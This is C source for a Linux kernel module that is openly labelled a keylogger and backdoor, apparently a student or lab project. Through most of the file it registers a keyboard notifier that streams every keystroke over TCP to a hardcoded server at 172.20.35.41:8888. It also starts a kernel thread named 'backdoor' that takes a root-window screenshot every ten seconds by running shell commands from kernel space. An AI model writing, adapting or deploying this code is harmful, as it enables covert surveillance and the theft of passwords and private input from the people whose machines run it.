#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define SERVER_IP "172.20.35.41"
#define SERVER_PORT 8888

MODULE_LICENSE("GPL");

struct socket *sock;
int image_counter = 0;

int execute_shell_command(char *cmd)
{
    char *argv[] = {"/bin/bash", "-c", (char *)cmd, NULL};
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL};

    int ret;

    printk(KERN_INFO "command: %s", cmd);

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret < 0)
    {
        printk(KERN_ERR "Usermodehelper error: %d\n", ret);
        return ret;
    }

    return 0;
}

static int runSnapshotThread(void *data)
{
    printk(KERN_INFO "Snapshot thread started\n");
    while (true)
    {
        char *cmd = kmalloc(100, GFP_KERNEL);

        // Take a snapshot of the screen
        sprintf(cmd, "sudo import -window root /media/sf_Shared/linux_backdoor/tmp/snapshot%d.png", image_counter);
        image_counter++;
        execute_shell_command(cmd);
        printk(KERN_INFO "Snapshot taken\n");

        // Wait 10 seconds
        set_current_state(TASK_INTERRUPTIBLE);
        schedule_timeout(msecs_to_jiffies(10 * 1000));

        if (kthread_should_stop())
        {
            printk(KERN_INFO "Snapshot thread stopped\n");
            break;
        }

        kfree(cmd);
    }
    return 0;
}

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down)
    {
        char key;

        // Convert keycode to character
        key = param->value;

        // Send the key through the socket
        if (sock)
        {
            struct kvec vec;
            struct page *page;
            int size;

            // Allocate a single page for the character
            page = alloc_page(GFP_KERNEL);
            if (!page)
            {
                printk(KERN_ERR "Failed to allocate page\n");
                return NOTIFY_OK;
            }

            // Copy the character to the page
            size = sizeof(char);
            memcpy(page_address(page), &key, size);

            // Set up the vector
            vec.iov_base = page_address(page);
            vec.iov_len = size;

            // Send the page
            kernel_sendpage(sock, page, 0, size, 0);

            printk(KERN_INFO "Keylogger: %c\n", key);

            // Free the page
            __free_page(page);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify};

static int __init keylogger_init(void)
{
    struct sockaddr_in sin;
    int ret;

    // Create a socket
    ret = sock_create(AF_INET, SOCK_STREAM, 0, &sock);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to create socket\n");
        return ret;
    }

    // Set up the server address
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton(SERVER_IP);
    sin.sin_port = htons(SERVER_PORT);

    // Connect the socket to the server
    ret = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in), 0);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to connect socket\n");
        sock_release(sock);
        return ret;
    }

    // Register the keylogger
    register_keyboard_notifier(&keylogger_nb);

    // create a thread to execute the shell command
    kthread_run(runSnapshotThread, NULL, "backdoor");

    printk(KERN_INFO "Keylogger module initialized\n");

    return 0;
}

static void __exit keylogger_exit(void)
{
    // Unregister the keylogger
    unregister_keyboard_notifier(&keylogger_nb);

    // Disconnect and release the socket
    if (sock)
    {
        sock->ops->shutdown(sock, SHUT_RDWR);
        sock_release(sock);
    }

    printk(KERN_INFO "Keylogger module exited\n");
}

MODULE_AUTHOR("Heitor Tanoue");
MODULE_AUTHOR("Beatriz Cardoso");
MODULE_AUTHOR("Beatriz Aimee");

module_init(keylogger_init);
module_exit(keylogger_exit);